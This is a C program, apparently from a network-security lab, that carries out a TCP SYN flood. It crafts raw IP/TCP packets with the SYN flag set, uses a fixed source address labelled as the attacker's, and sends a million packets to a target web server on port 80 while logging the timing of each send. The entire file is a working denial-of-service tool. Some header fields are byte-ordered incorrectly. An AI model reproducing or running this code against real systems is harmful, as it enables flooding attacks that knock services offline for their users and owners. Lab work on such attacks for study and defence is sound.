#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>
#include <sys/types.h>



// Constants
#define INNER_LOOPS 10000
#define OUTER_LOOPS 100
#define TARGET_IP "10.9.0.4"
#define TARGET_PORT 80
#define ATTACKER_IP "10.9.0.2"
#define PACKET_LEN 4096
#define SEC_TO_MS 1000.0
#define NSEC_TO_MS 1000000.0
#define WINDOW_SIZE 5840


/* 
    96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
*/
typedef struct pseudo_header
{
    u_int32_t source_address; 
    u_int32_t dest_address;
    u_int8_t placeholder; 
    u_int8_t protocol; 
    u_int16_t tcp_length;
}pseudo_header;
 

// Function to calculate checksum
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    unsigned short *w = buf;
    int nleft = len;
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        sum += *(unsigned char *)w;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

void setIPHeader(struct iphdr *iph, struct sockaddr_in *sin) { // Function to set IP header
    iph->ihl = 5; // IP header length
    iph->version = 4; // IP version, IPv4
    iph->tos = 0; // Type of service
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr); // Total length of the packet
    iph->id = htonl(rand() % 65535); // IP ID, random number
    iph->frag_off = 0; // Fragment offset
    iph->ttl = 255; // Time to live, number of hops
    iph->protocol = IPPROTO_TCP; // Protocol, TCP
    iph->saddr = inet_addr(ATTACKER_IP); // Attacker's IP
    iph->daddr = sin->sin_addr.s_addr; // Destination IP
    iph->check = 0; // Checksum will be calculated later
}

void setTCPHeader(struct tcphdr *tcph) { // Function to set TCP header
    tcph->source = htons(rand() % 65535); // Source port, random number
    tcph->dest = htons(TARGET_PORT); // Destination port
    tcph->seq = htons(rand() % 65535);  // Sequence number
    tcph->ack_seq = htons(rand() % 65535);  // Acknowledgement number
    tcph->doff = 5; // TCP header length
    tcph->fin = 0; // FIN flag
    tcph->syn = 1; // SYN flag - sets to 1 to establish a connection, and flood, all other flags are set to 0
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(WINDOW_SIZE); // Window size
    tcph->check = 0; // Checksum will be calculated later
    tcph->urg_ptr = 0; // Urgent pointer
}

// Function to send a single SYN packet and log the time it took
void send_syn_packet(int sockfd, struct sockaddr_in *target_addr, int index, FILE *log_file) {
    char packet[PACKET_LEN]; // Packet to be sent
    memset(packet, 0, PACKET_LEN); // Initialize packet with 0

    // IP header
    struct iphdr *iph = (struct iphdr *) packet; //Create IP header based on packet

    // TCP header
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr)); // Create TCP header based on packet and IP header

    // Set IP header
    setIPHeader(iph, target_addr); 

    // Set TCP header
    setTCPHeader(tcph);

    // Calculate IP checksum
    iph->check = checksum((unsigned short *) packet, iph->tot_len); 

    // Calculate TCP checksum, which requires a pseudo header
    struct pseudo_header psh; // Create pseudo header
    psh.source_address = inet_addr(ATTACKER_IP); // Attacker's IP
    psh.dest_address = target_addr->sin_addr.s_addr; // Destination IP
    psh.placeholder = 0; // Placeholder
    psh.protocol = IPPROTO_TCP; // Protocol, TCP
    psh.tcp_length = htons(sizeof(struct tcphdr)); // TCP header length
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr); // Size of pseudo header
    char pseudogram[psize]; // Pseudogram to store pseudo header and TCP header
    memset(pseudogram, 0, psize); // Initialize pseudogram with 0
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header)); // Copy pseudo header to pseudogram
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr)); // Copy TCP header to pseudogram
    tcph->check = checksum((unsigned short *) pseudogram, psize); // Calculate TCP checksum

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }

    // Send the packet and log the time it took
    struct timespec start_time, finish_time;
    clock_gettime(CLOCK_MONOTONIC_RAW, &start_time);

    if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *) target_addr, sizeof(*target_addr)) < 0) { //sends the packet
        perror("Send failed");
    }

    clock_gettime(CLOCK_MONOTONIC_RAW, &finish_time);

    // Calculate time difference in milliseconds
    float time_diff = (finish_time.tv_sec - start_time.tv_sec) * SEC_TO_MS + (finish_time.tv_nsec - start_time.tv_nsec) / NSEC_TO_MS;

    // Log the time difference
    fprintf(log_file, "%d %lf\n", index, time_diff);
}

int main() {
    int sockfd;
    struct sockaddr_in target_addr;
    FILE *log_file = fopen("syns_result_c.txt", "w");

    if (log_file == NULL) {
        perror("Failed to open log file");
        return 1;
    }

    // Initialize target address
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr);

    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Send SYN packets
    for (int i = 0; i < OUTER_LOOPS; i++) {
        for (int j = 0; j < INNER_LOOPS; j++) {
            send_syn_packet(sockfd, &target_addr, i * INNER_LOOPS + j, log_file);
            if ((j + 1) % 1000 == 0) {
                printf("Sent %d packets in iteration %d\n", j + 1, i + 1);
            }
        }
    }

    fclose(log_file);
    close(sockfd);
    return 0;
}
